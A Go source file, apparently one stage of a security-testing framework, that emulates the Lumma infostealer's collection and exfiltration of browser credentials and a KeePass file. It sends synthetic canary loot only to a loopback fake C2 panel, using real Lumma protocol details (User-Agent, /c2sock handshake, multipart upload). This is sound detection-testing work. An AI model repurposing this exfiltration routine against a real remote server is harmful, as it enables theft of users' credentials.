// Stage 4 — T1005 / T1041 / T1071.001 Collection & Exfiltration over C2
// F0RT1KA Security Testing Framework — Lumma-style infostealer emulation
//
// LummaC2 exfiltrates the staged harvest to its panel over HTTP(S) POST with
// a distinctive hardcoded User-Agent. Documented protocol anchors used here:
//
//   • User-Agent "TeslaBrowser/5.5" (malpedia; Darktrace PCAP analysis)
//   • URI /c2sock with form-encoded command parameters (Darktrace; Microsoft
//     threat-intelligence writeup on LummaC2 C2 form data)
//   • handshake POST act=live (ESET Lumma teardown research)
//   • config/command POSTs carrying an LID identifier + J parameter (ESET)
//   • recent builds hit a fingerprinting endpoint before upload
//     (Gen Digital / Remus research)
//
// Emulation, with ZERO external egress:
//   1. Collects the loot staged by Stage 3 (c:\Users\fortika-test\
//      lumma_staging\loot) if present; otherwise self-generates an equivalent
//      canary loot set so this stage is independent of Stage 3's outcome.
//   2. Archives the loot in memory (Go archive/zip — Lumma builds its upload
//      archive in memory).
//   3. Starts a loopback receiver on 127.0.0.1 emulating the Lumma panel:
//      fingerprint probe GET first, then the act=live handshake POST, then
//      the multipart upload POST — all with the real request shapes and UA.
//   4. Byte-counted classification (bytes received == bytes sent).
//
// EXIT CODES: 0 = archive bytes arrived at the C2 emulation; 126 = positive
// denial evidence on the transfer (reset/forcibly closed); 999 = error.

//go:build windows
// +build windows

package main

import (
	"archive/zip"
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "26a8b54e-b51c-489d-beae-295e1eecc524"
	TECHNIQUE_ID   = "T1041"
	TECHNIQUE_NAME = "Collection & Exfiltration over LummaC2 Channel (T1005 / T1041 / T1071.001)"
	STAGE_ID       = 4
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

// lummaUserAgent is the hardcoded C2 User-Agent documented across Lumma
// samples (malpedia, Darktrace). Using the real value is identifier fidelity.
const lummaUserAgent = "TeslaBrowser/5.5"

// stagingRel is where Stage 3 stages the harvest: ARTIFACT_DIR\lumma_staging\loot.
const stagingRel = "lumma_staging"

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, TECHNIQUE_NAME)

	exitCode := performTechnique()

	switch exitCode {
	case StageSuccess:
		fmt.Printf("[STAGE %s] Exfiltration channel unimpeded - harvest received by C2 emulation\n", TECHNIQUE_ID)
		LogMessage("SUCCESS", TECHNIQUE_ID, "Multipart upload completed - all bytes arrived at the LummaC2 emulation receiver")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Staged harvest exfiltrated unimpeded (loopback)")
	case StageBlocked:
		fmt.Printf("[STAGE %s] Exfiltration prevented (positive evidence)\n", TECHNIQUE_ID)
		LogMessage("BLOCKED", TECHNIQUE_ID, "Exfiltration transfer positively prevented")
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "Exfiltration transfer denied with positive evidence")
	default:
		fmt.Printf("[STAGE %s] Stage error - inconclusive\n", TECHNIQUE_ID)
		LogMessage("ERROR", TECHNIQUE_ID, "Exfiltration stage inconclusive or prerequisite failure")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", "Stage error or inconclusive")
	}
	os.Exit(exitCode)
}

func performTechnique() int {
	// ------------------------------------------------------------------
	// Step 1: Locate or generate the harvest (stage independence).
	// ------------------------------------------------------------------
	lootDir := filepath.Join(ARTIFACT_DIR, stagingRel, "loot")
	info, err := os.Stat(lootDir)
	if err != nil || !info.IsDir() || countFiles(lootDir) == 0 {
		fmt.Printf("[STAGE %s] Phase 1: Stage-3 loot absent - generating independent canary harvest\n", TECHNIQUE_ID)
		LogMessage("INFO", TECHNIQUE_ID, "Generating standalone canary loot (stage independence)")
		if err := generateStandaloneLoot(lootDir); err != nil {
			LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("standalone loot generation failed: %v", err))
			return StageError
		}
	} else {
		fmt.Printf("[STAGE %s] Phase 1: Collecting Stage-3 harvest from %s\n", TECHNIQUE_ID, lootDir)
		LogMessage("INFO", TECHNIQUE_ID, "Collecting staged browser-credential harvest (T1005)")
	}
	defer func() {
		if err := os.RemoveAll(filepath.Dir(lootDir)); err != nil {
			LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("cleanup: staging dir: %v", err))
		} else {
			LogMessage("INFO", TECHNIQUE_ID, "cleanup: exfiltrated loot removed from staging")
		}
	}()

	// ------------------------------------------------------------------
	// Step 2: In-memory archive (Lumma builds the upload zip in memory).
	// ------------------------------------------------------------------
	var zipBuf bytes.Buffer
	fileCount, zerr := zipDir(lootDir, &zipBuf)
	if zerr != nil || fileCount == 0 {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("archive build failed (%d files): %v", fileCount, zerr))
		return StageError
	}
	zipBytes := zipBuf.Bytes()
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Harvest archived in memory: %d files, %d bytes", fileCount, len(zipBytes)))

	// ------------------------------------------------------------------
	// Step 3: Loopback LummaC2 panel emulation + exfil sequence.
	// ------------------------------------------------------------------
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("failed to bind loopback listener: %v", err))
		return StageError
	}
	defer listener.Close()

	var received int64
	receivedDone := make(chan struct{})
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		n, _ := io.Copy(io.Discard, r.Body)
		received += n
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("C2 rx: %s %s — %d bytes (UA: %s)", r.Method, r.URL.Path, n, r.UserAgent()))
		if strings.HasPrefix(r.URL.Path, "/upload") {
			close(receivedDone)
		}
		w.WriteHeader(http.StatusOK)
	})
	server := &http.Server{Handler: mux}
	go func() { _ = server.Serve(listener) }()
	defer server.Close()

	base := fmt.Sprintf("http://%s", listener.Addr().String())
	client := &http.Client{Timeout: 30 * time.Second}

	synth := make([]byte, 6)
	_, _ = rand.Read(synth)
	lid := "F0RT1KA-SYN-" + hex.EncodeToString(synth)

	// 3a. Fingerprint probe first (recent Lumma build behavior).
	fpReq, _ := http.NewRequest(http.MethodGet, base+"/fp?id="+lid+"&b=chrome", nil)
	fpReq.Header.Set("User-Agent", lummaUserAgent)
	if resp, ferr := client.Do(fpReq); ferr == nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Fingerprint probe answered (status %d)", resp.StatusCode))
	} else {
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("fingerprint probe failed (non-fatal): %v", ferr))
	}

	// 3b. Handshake: POST act=live with the hardcoded UA (ESET-documented).
	hsResp, hsErr := postForm(client, base+"/c2sock", fmt.Sprintf("act=live&lid=%s&j=2", lid))
	if hsErr != nil {
		return classifyTransferErr(hsErr, received)
	}
	io.Copy(io.Discard, hsResp.Body)
	hsResp.Body.Close()
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Handshake act=live answered (status %d)", hsResp.StatusCode))

	// 3c. Multipart upload of the harvest archive (panel upload shape).
	var mpBuf bytes.Buffer
	mw := multipart.NewWriter(&mpBuf)
	_ = mw.WriteField("lid", lid)
	_ = mw.WriteField("hwid", "F0RT1KA-SYNTHETIC-HWID")
	_ = mw.WriteField("os", "Windows 11 Pro")
	_ = mw.WriteField("b", "chrome,edge")
	fw, fwErr := mw.CreateFormFile("file", "archive.zip")
	if fwErr != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("multipart build failed: %v", fwErr))
		return StageError
	}
	if _, err := fw.Write(zipBytes); err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("multipart write failed: %v", err))
		return StageError
	}
	mw.Close()

	upReq, _ := http.NewRequest(http.MethodPost, base+"/upload/", &mpBuf)
	upReq.Header.Set("User-Agent", lummaUserAgent)
	upReq.Header.Set("Content-Type", mw.FormDataContentType())
	upReq.ContentLength = int64(mpBuf.Len())

	upResp, upErr := client.Do(upReq)
	if upErr != nil {
		return classifyTransferErr(upErr, received)
	}
	io.Copy(io.Discard, upResp.Body)
	upResp.Body.Close()

	select {
	case <-receivedDone:
	case <-time.After(5 * time.Second):
	}

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Upload complete: sent=%d received=%d status=%d", mpBuf.Len(), received, upResp.StatusCode))
	if received >= int64(len(zipBytes)) {
		LogMessage("CRITICAL", TECHNIQUE_ID, "Full harvest received by LummaC2 emulation endpoint - exfiltration channel unimpeded")
		return StageSuccess
	}
	if received == 0 {
		LogMessage("ERROR", TECHNIQUE_ID, "No bytes arrived despite completed POST - inconclusive")
		return StageError
	}
	LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Partial transfer (%d/%d archive bytes) - inconclusive", received, len(zipBytes)))
	return StageError
}

// classifyTransferErr maps transport failures to 126 only on explicit denial
// signals in the loopback transfer; everything else is inconclusive (999).
func classifyTransferErr(err error, received int64) int {
	msg := strings.ToLower(err.Error())
	if strings.Contains(msg, "forcibly closed") || strings.Contains(msg, "connection reset") {
		LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("Exfil transfer returned denial evidence: %v (received=%d)", err, received))
		return StageBlocked
	}
	LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Exfil POST failed (inconclusive): %v", err))
	return StageError
}

func postForm(client *http.Client, url, form string) (*http.Response, error) {
	req, err := http.NewRequest(http.MethodPost, url, strings.NewReader(form))
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", lummaUserAgent)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	return client.Do(req)
}

func countFiles(root string) int {
	n := 0
	_ = filepath.Walk(root, func(_ string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() {
			n++
		}
		return nil
	})
	return n
}

func zipDir(root string, buf *bytes.Buffer) (int, error) {
	zw := zip.NewWriter(buf)
	count := 0
	err := filepath.Walk(root, func(p string, info os.FileInfo, werr error) error {
		if werr != nil || info.IsDir() {
			return werr
		}
		rel, rerr := filepath.Rel(root, p)
		if rerr != nil {
			return rerr
		}
		w, cerr := zw.Create(filepath.ToSlash(rel))
		if cerr != nil {
			return cerr
		}
		f, oerr := os.Open(p)
		if oerr != nil {
			return oerr
		}
		defer f.Close()
		if _, cerr = io.Copy(w, f); cerr != nil {
			return cerr
		}
		count++
		return nil
	})
	if err != nil {
		return count, err
	}
	return count, zw.Close()
}

// generateStandaloneLoot writes a canary harvest equivalent to Stage 3's
// output, so Stage 4 validates the exfil primitive regardless of Stage 3.
func generateStandaloneLoot(lootDir string) error {
	if err := os.MkdirAll(lootDir, 0755); err != nil {
		return err
	}
	synth := make([]byte, 4)
	_, _ = rand.Read(synth)
	marker := hex.EncodeToString(synth)
	manifest := fmt.Sprintf(`{"run_marker":"%s","note":"F0RT1KA SYNTHETIC HARVEST - standalone stage-4 loot","decrypted":[{"origin":"https://portal.synthetic-bank-01.example.test/login","username":"canary.user@example.test","password":"F0RT1KA-CANARY-%s-01"}]}`,
		marker, marker)
	if err := os.WriteFile(filepath.Join(lootDir, "credentials.json"), []byte(manifest), 0644); err != nil {
		return err
	}
	kdbx := append([]byte{0x03, 0xD9, 0xA2, 0x9A, 0x67, 0xFB, 0x4B, 0xB5}, []byte("F0RT1KA-SYNTHETIC-KEEPASS-"+marker)...)
	if err := os.WriteFile(filepath.Join(lootDir, "KeePass.kdbx"), kdbx, 0644); err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(lootDir, "logins.json"),
		[]byte(fmt.Sprintf(`{"nextId":1,"logins":[{"hostname":"https://mail.example.test","encryptedUsername":"F0RT1KA-CANARY-GECKO-U-%s"}]}`, marker)), 0644)
}
